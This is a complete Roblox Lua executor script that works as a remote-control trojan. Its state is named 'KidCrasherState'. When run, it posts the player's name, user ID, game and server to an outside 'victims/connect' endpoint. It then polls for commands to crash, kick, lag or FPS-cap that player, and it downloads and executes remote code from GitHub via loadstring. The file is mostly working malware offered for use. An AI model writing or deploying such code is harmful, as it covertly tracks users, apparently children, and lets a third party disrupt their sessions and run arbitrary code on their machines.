local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local request = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or krnl_request
if not request then return end

local gameName = "Unknown"
pcall(function()
  gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
end)

local state = _G.KidCrasherState or {}
_G.KidCrasherState = state
state.connections = state.connections or {}

local function clearConnections()
  for _, c in ipairs(state.connections) do
    pcall(function() c:Disconnect() end)
  end
  state.connections = {}
end

local function crashMe()
  task.spawn(function()
    while true do
      local t = {}
      for i = 1, 100000 do
        t[i] = {i, i, i, i}
      end
    end
  end)
end

local function lagNormal()
  clearConnections()
  table.insert(state.connections, RunService.Heartbeat:Connect(function()
    for i = 1, 5000 do
      local _ = math.sqrt(i) * math.sin(i)
    end
  end))
end

local function lagCrazy()
  clearConnections()
  table.insert(state.connections, RunService.Heartbeat:Connect(function()
    for i = 1, 250000 do
      local _ = math.sqrt(i) * math.sin(i) * math.cos(i)
    end
  end))
end

local function restMe()
  task.spawn(function()
    pcall(function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/2sneaky/rbxscripts.github.io/refs/heads/main/simple_reset"))()
    end)
  end)
end


local function fpsSet(on)
  pcall(function()
    setfpscap(on and 10 or 240)
  end)
end

local function kickMe()
  pcall(function() player:Kick() end)
  pcall(function()
    local nc = game:FindFirstChildOfClass("NetworkClient")
    if nc then nc:Disconnect() end
  end)
  pcall(function() game:Shutdown() end)
  pcall(function()
    game:GetService("TeleportService"):Teleport(0, player)
  end)
end

local handlers = {
  ["Crash"] = crashMe,
  ["Kick"] = kickMe,
  ["Lag N"] = lagNormal,
  ["Lag C"] = lagCrazy,
  ["Lag Stop"] = clearConnections,
  ["Rest"] = restMe,
  ["FPS On"] = function() fpsSet(true) end,
  ["FPS Off"] = function() fpsSet(false) end,
}

task.spawn(function()
  pcall(function()
    request({
      Url = "https://project--30882a58-98d6-461d-b875-d3a43b72e96e-dev.lovable.app/api/public/victims/connect",
      Method = "POST",
      Headers = {["Content-Type"] = "application/json"},
      Body = HttpService:JSONEncode({
        name = player.Name,
        userId = player.UserId,
        game = gameName,
        ping = math.floor((player:GetNetworkPing() or 0) * 1000),
        server = game.JobId ~= "" and game.JobId:sub(1, 8) or "solo"
      })
    })
  end)
end)

task.spawn(function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/maxhp20/Hide-delta-controller-/refs/heads/main/Hide%20delta%20for%20controller"))()
end)

state.pollId = (state.pollId or 0) + 1
local pollId = state.pollId
task.spawn(function()
  local body = HttpService:JSONEncode({userId = player.UserId})
  while state.pollId == pollId do
    pcall(function()
      local resp = request({
        Url = "https://project--30882a58-98d6-461d-b875-d3a43b72e96e-dev.lovable.app/api/public/victims/poll",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = body
      })
      if resp and resp.Body then
        local ok, data = pcall(function() return HttpService:JSONDecode(resp.Body) end)
        if ok and data and data.cmds then
          for _, cmd in ipairs(data.cmds) do
            local fn = handlers[cmd]
            if fn then task.spawn(fn) end
          end
        end
      end
    end)
    task.wait(0.25)
  end
end)
